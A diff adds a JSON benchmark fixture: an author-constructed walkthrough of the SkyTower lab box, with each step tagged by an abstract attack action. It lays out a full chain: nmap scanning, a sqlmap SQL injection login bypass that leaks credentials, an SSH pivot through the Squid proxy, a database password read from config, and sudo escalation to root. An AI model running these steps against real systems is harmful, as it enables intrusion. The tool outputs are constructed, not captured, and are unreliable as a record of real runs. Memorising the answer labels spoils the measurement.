@@ -1,0 +1,101 @@
+{
+  "box": "SkyTower",
+  "source": "Representative walkthrough constructed from public SkyTower write-up structure (SQLi login bypass -> leaked creds -> SSH-via-Squid pivot -> sudo root). Author-constructed for offline Phase-1 mapping measurement; NOT a live capture.",
+  "abstract_family": "leak_authed_privesc",
+  "vulnhub_correspondence": "Login form is vulnerable to SQL injection auth bypass which also leaks DB credentials; SSH is reachable only through the Squid proxy on 3128; after the SSH pivot a sudo-allowed cat reads the root flag.",
+  "target_label": "http://10.10.10.5",
+  "steps": [
+    {
+      "step": 0,
+      "phase": "recon",
+      "actor_intent": "Scan the target for open services with nmap.",
+      "tool": "nmap",
+      "tool_command": "nmap -sV -p- 10.10.10.5",
+      "tool_output": "PORT     STATE    SERVICE  VERSION\n22/tcp   filtered ssh\n80/tcp   open     http     Apache httpd 2.2.22\n3128/tcp open     http-proxy Squid http proxy 3.1.20",
+      "reference_abstract_action": "service_enumeration",
+      "reference_state_after": {"open_services": ["http:80"], "tech_stack": ["apache"]}
+    },
+    {
+      "step": 1,
+      "phase": "enumeration",
+      "actor_intent": "Fingerprint the web application and confirm the login page.",
+      "tool": "whatweb",
+      "tool_command": "whatweb http://10.10.10.5/",
+      "tool_output": "http://10.10.10.5/ [200 OK] Apache[2.2.22], PHP[5.4.4], Title[Skytech - Home], HTML5",
+      "reference_abstract_action": "http_fingerprint",
+      "reference_state_after": {"tech_stack": ["apache", "php"]}
+    },
+    {
+      "step": 2,
+      "phase": "input-discovery",
+      "actor_intent": "Inspect the login page HTML to discover the form inputs.",
+      "tool": "curl",
+      "tool_command": "curl -s http://10.10.10.5/login.php",
+      "tool_output": "<form action='login.php' method='post'>\n<input type='text' name='email'>\n<input type='password' name='password'>\n<input type='submit' value='Login'></form>",
+      "reference_abstract_action": "input_discovery",
+      "path": "/login.php",
+      "reference_state_after": {"known_forms": ["form:/login.php"], "known_parameters": ["/login.php?email", "/login.php?password"]}
+    },
+    {
+      "step": 3,
+      "phase": "exploit",
+      "actor_intent": "Bypass authentication with an SQL injection in the email field and read the leaked credentials.",
+      "tool": "sqlmap",
+      "tool_command": "sqlmap -u http://10.10.10.5/login.php --data 'email=*&password=*' --dbms mysql",
+      "tool_output": "parameter 'email' is injectable\nthe back-end DBMS is MySQL and is vulnerable\nlogin bypassed; application returned: Welcome back john! credentials in use email=john@skytech.com password=hereisjohn",
+      "reference_abstract_action": "exploit_attempt",
+      "vuln_id": "sqli_auth_bypass",
+      "reference_state_after": {"verified_vulnerabilities": ["sqli_auth_bypass"]}
+    },
+    {
+      "step": 4,
+      "phase": "pivot",
+      "actor_intent": "Log in over SSH as john, tunneling through the Squid proxy since 22 is filtered.",
+      "tool": "command",
+      "tool_command": "proxytunnel -p 10.10.10.5:3128 -d 127.0.0.1:22; ssh john@127.0.0.1",
+      "tool_output": "john@10.10.10.5's password:\nThis account is currently not available.\n(rbash) john@SkyTower:~$",
+      "reference_abstract_action": "out_of_abstraction",
+      "out_of_abstraction_reason": "Interactive SSH login (here tunnelled through Squid) is a non-web service authentication; the schema's auth_attempt/credential_use are web-form/HTTP only and there is no SSH/proxy-pivot action.",
+      "suggested_schema_extension": "ssh_remote_login",
+      "reference_state_after": {}
+    },
+    {
+      "step": 5,
+      "phase": "loot",
+      "actor_intent": "Read the web app database config to recover additional credentials.",
+      "tool": "fileread",
+      "tool_command": "cat /var/www/login.php",
+      "tool_output": "$db = new mysqli('localhost', 'root', 'ihatethisjob', 'SkyTech');",
+      "reference_abstract_action": "sensitive_file_read",
+      "file_id": "db_config",
+      "reference_state_after": {"read_files": ["db_config"]}
+    },
+    {
+      "step": 6,
+      "phase": "privesc",
+      "actor_intent": "Escalate to root using the sara account's sudo permissions.",
+      "tool": "privesc",
+      "tool_command": "su sara; sudo /bin/bash",
+      "tool_output": "# id\nuid=0(root) gid=0(root) groups=0(root)\nroot",
+      "reference_abstract_action": "privilege_escalation",
+      "rooted": true,
+      "reference_state_after": {"privilege_level": "root"},
+      "candidate_pool": [
+        "Escalate to root using the sara account's sudo permissions.",
+        "Read the root flag before having root access.",
+        "Re-run the SQL injection that already succeeded."
+      ]
+    },
+    {
+      "step": 7,
+      "phase": "loot",
+      "actor_intent": "Read the root flag.",
+      "tool": "fileread",
+      "tool_command": "sudo cat /root/flag.txt",
+      "tool_output": "Congratulations!!! ... flag{a8a3056c-... }",
+      "reference_abstract_action": "sensitive_file_read",
+      "file_id": "root_flag",
+      "reference_state_after": {"read_files": ["root_flag"]}
+    }
+  ]
+}
